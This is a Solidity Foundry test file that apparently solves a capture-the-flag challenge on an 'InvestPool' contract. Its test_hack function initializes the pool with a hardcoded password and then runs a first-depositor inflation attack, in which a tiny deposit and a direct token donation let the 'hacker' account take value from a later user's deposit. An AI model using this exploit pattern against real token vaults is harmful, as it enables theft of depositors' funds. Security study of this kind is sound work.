// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {LibString} from "solmate/utils/LibString.sol";

import "../src/PoolToken.sol";
import "../src/InvestPool.sol";

contract InvestPoolTest is Test {
    uint256 fork;

    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    address private constant PASSWORD_CONTRACT_ADDRESS = 0xA45aC53E355161f33fB00d3c9485C77be3c808ae;

    function setUp() external {
        // fork = vm.createFork(vm.envString("GOERLI_RPC_URL"));
        // vm.selectFork(fork);

        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
        
        string memory password = "j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx";

        pool.initialize(password);

        // fist pool deposit front running attack
        vm.prank(hacker);
        pool.deposit(1);

        vm.prank(hacker);
        token.transfer(address(pool), 100 ether);

        userDeposit(200 ether);

				vm.prank(hacker);
        pool.withdrawAll();

        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}